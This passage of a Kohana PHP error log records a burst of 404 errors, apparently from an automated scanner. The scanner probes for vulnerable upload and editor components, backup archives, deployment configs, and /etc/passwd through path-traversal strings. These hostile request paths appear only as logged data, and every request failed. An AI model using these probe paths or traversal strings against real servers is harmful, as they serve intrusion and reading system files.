#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: common/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: common/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL plugins/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL plugins/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: bitbucket-pipelines.yaml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: bitbucket-pipelines.yaml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL lib/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL lib/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: class/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: class/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/db.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/db.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: azure-pipelines.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: azure-pipelines.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL lib/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL lib/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: azure-pipelines.yaml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: azure-pipelines.yaml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: xmlrpc.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: xmlrpc.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL jscripts/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL jscripts/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL webdav was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL webdav was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/scripts/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/scripts/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/upload/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/upload/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/create.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/create.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appspec.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appspec.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL jscripts/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL jscripts/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL etc/passwd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL etc/passwd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_jnewsletter/includes/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_jnewsletter/includes/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appspec.yaml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appspec.yaml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Dockerrun.aws.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Dockerrun.aws.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_joomleague/assets/classes/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_joomleague/assets/classes/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ansible.cfg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ansible.cfg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL sling was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL sling was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_redmystic/chart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_redmystic/chart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL scripts/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL scripts/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dump.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dump.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: assets/components/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: assets/components/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/invit0r/lib/php-ofc-library/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/invit0r/lib/php-ofc-library/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL scripts/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL scripts/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL wp-includes/js/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL wp-includes/js/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dbdump.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/dbdump.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_alphacontent/assets/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_alphacontent/assets/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL editor/FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL editor/FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL includes/js/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL includes/js/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_alphauserpoints/assets/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_alphauserpoints/assets/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL mambots/editors/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL mambots/editors/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/윙윙/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/woopra/inc/php-ofc-library/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/woopra/inc/php-ofc-library/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL include/javascript/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL include/javascript/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/database.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/database.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/cep6jefps1j4.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/cep6jefps1j4.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/cep6jefps1j4.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/cep6jefps1j4.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:46 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/cep6jefps1j4 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:46 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/cep6jefps1j4 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
